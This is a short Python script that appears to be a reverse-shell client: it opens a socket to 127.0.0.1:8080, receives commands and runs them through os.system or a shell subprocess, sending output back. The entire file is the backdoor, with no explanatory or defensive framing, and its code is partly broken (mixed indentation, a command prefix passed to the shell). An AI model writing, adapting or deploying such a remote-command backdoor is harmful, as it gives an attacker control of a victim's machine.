import socket
import os
import subprocess
ip="127.0.0.1"
port=8080 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
while True:
    com=s.recv(1024)
    if com=="exit":
        s.close()
        break
    elif com.startswith("execute="):
        os.system(com[8:])
    elif com.startswith("os="):
	    proc = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        op= proc.stdout.read()
        op+=proc.stderr.read()
        s.send(op)
    else:
        pass
